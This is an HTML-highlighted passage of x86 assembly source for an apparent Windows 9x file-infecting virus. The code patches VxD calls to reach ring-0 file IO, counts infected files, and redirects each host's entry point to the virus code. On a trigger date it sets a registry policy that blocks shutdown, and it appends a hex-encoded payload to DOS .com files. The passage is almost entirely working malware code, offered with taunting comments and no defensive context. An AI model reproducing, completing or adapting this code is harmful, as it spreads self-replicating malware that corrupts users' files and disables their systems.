        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">12345678h</span><span class="sc4">/</span><span class="sc5">debug_beep_FREQ</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">debug_beep_DELAY</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">debug_beep2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">        

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">12345678h</span><span class="sc4">/</span><span class="sc5">debug_beep_FREQ2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">12345678h</span><span class="sc4">/</span><span class="sc5">debug_beep_FREQ2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">debug_beep_DELAY2</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">geenirritantgebiepvandaag</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;blaa dit versta jij toch niet looser :P</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       File IO function, called lot of times, better for patching callback</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">R0_FileIO</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VxD4V</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Ring0_FileIO</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc5">IFSMgr</span><span class="sc0">
</span><span class="sc5">VxD4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Increases the ASCII counter of infections</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">IncCounter</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;counts a ASCII counter... when there are more than</span><span class="sc0">
                        </span><span class="sc1">;9999999 files infected it contains a bug, but i don't</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">counter</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;expect that from this vir :)</span><span class="sc0">

</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'9'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'0'</span><span class="sc0">        
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next</span><span class="sc0">
</span><span class="sc5">ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Some things used in the registery payload</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">KeyOfPolicies</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">valuename1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NoClose"</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">            </span><span class="sc1">;no shutdown :)</span><span class="sc0">
</span><span class="sc5">ValueToSet</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">1h</span><span class="sc0">


</span><span class="sc5">CheckThePayloadDate</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                          </span><span class="sc1">;Get day</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;(returns it in hex btw!)</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                          </span><span class="sc1">;Is it 6th?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">noPayload</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">;Get month</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;(returns it in hex btw!)</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                          </span><span class="sc1">;Is it 4th?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">noPayload</span><span class="sc0">                       </span><span class="sc1">;(</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pointertope</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;just a buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KeyOfPolicies</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;open this key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">VxD6V</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">RegOpenKey</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">VxD6</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">RegOpenKey</span><span class="sc0">
                                                
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">;reset stackpointer</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;length of value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ValueToSet</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;set value true</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_DWORD</span><span class="sc0">                       </span><span class="sc1">;type</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;reserved</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">valuename1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">pointertope</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;handle</span><span class="sc0">
</span><span class="sc5">VxD7V</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">RegSetValueEx</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;1 = VMM</span><span class="sc0">
</span><span class="sc5">VxD7</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">RegSetValueEx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">noPayload</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Patches the VxDCalls (on execute windows modifies them to a real call)</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">VxDPatch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">020cdh</span><span class="sc0">       </span><span class="sc1">;int 20 used by VxDCall</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD1</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">            </span><span class="sc1">;int 20</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD1</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">VxD1V</span><span class="sc0">      </span><span class="sc1">;dd with IFSMGR &amp; fn.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD2</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD2</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">VxD2V</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD3</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD3</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">VxD3V</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD4</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD4</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">VxD4V</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD5</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD5</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">VxD5V</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD6</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD6</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">VxD6V</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD7</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxD7</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">VxD7V</span><span class="sc0">
        
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc5">rnd32_seed</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">


</span><span class="sc1">;------ this code is putted at EIP of host and jmps to virus code -----------;</span><span class="sc0">
</span><span class="sc5">JmpToCode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">           </span><span class="sc1">;jnc </span><span class="sc0">
</span><span class="sc5">randombla</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;some place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">distance</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndJmpToCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;this sweet code will be appended to .com files (234 / 0eah bytes large)</span><span class="sc0">

</span><span class="sc5">dospayload</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">02ch</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">0eeh</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ech</span><span class="sc4">,</span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">095h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc4">,</span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0a5h</span><span class="sc4">,</span><span class="sc2">0a5h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">042h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">0abh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">09eh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc0">
